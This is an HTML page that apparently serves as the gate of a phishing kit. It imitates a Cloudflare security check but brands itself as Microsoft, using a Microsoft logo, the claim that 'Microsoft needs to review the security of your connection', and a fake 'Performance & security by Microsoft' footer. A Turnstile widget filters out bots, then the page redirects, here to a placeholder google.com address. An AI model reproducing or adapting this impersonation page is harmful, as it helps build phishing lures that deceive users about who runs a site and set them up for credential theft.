<!DOCTYPE html>
<html lang="en-US">

<head>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async
        defer></script>
    <title>Just a moment...</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta name="robots" content="noindex,nofollow" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <link rel="stylesheet" href="style.css">
</head>

<body class="no-js">
    <div class="main-wrapper" role="main">
        <div class="main-content">
            <h1 class="zone-name-title h1">
                <div>
                    <img class=""
                        src="https://findicons.com/files/icons/2796/metro_uinvert_dock/64/microsoft_new_logo_alt.png"
                        style="margin-bottom: -17px" onerror="this.onerror=null;this.parentNode.removeChild(this)" />
                    <div id="site-name">Microsoft</div>
                </div>
            </h1>
            <div class="container" style="display: flex; justify-content: center;">
                <img src="blocked-keep-getting-prompted-to-login-on-the-web-v0-olr0zn6s6c0a1.gif" alt="">
            </div>
            <div id="turnstileWidget"></div>
            <div class="container" style="display: flex; justify-content: center;">
                <img src="logo.png" alt="Microsoft" height="40px">
            </div>
            <span id="challenge-error-text"></span>
            <noscript>
                <div id="challenge-error-title">
                    <div class="h2">
                        <div class="icon-wrapper">
                            <div class="heading-icon warning-icon"></div>
                        </div>
                        <span class="icon-wrapper">
                            <div class="heading-icon warning-icon"></div>
                        </span>
                        <span id="challenge-error-text">Enable JavaScript and cookies to continue</span>
                    </div>
                </div>
            </noscript>
            <p data-translate="please_wait" id="cf-spinner-please-wait">Please stand by, while we are checking if the
                site connection is secure</p>
            <div id="challenge-body-text" class="core-msg spacer">
                <div id="site-name" style="float: left; margin-left: 10px; margin-right: 10px">Microsoft</div>
                <div style="margin: 10px">needs to review the security of your connection before proceeding.</div>
            </div>
        </div>
    </div>
    <div class="footer" role="contentinfo">
        <div class="footer-inner">
            <div class="text-center">
                Performance &amp; security by
                <a rel="noopener noreferrer" href="#" target="_blank">Microsoft</a>
            </div>
        </div>
    </div>
    <!-- <script src="main.js"></script> -->
    <script>
        window.onloadTurnstileCallback = function () {
            turnstile.render('#turnstileWidget', {
                sitekey: '0x4AAAAAAAfqzm9_KK7B52xE',
                callback: function (token) {
                    console.log(`Challenge Success ${token}`);
                    window.location.href = 'https://www.google.com';
                },
                'theme': 'light', // Optional: Adjust to match your design
            });
        };

    </script>
</body>

</html>
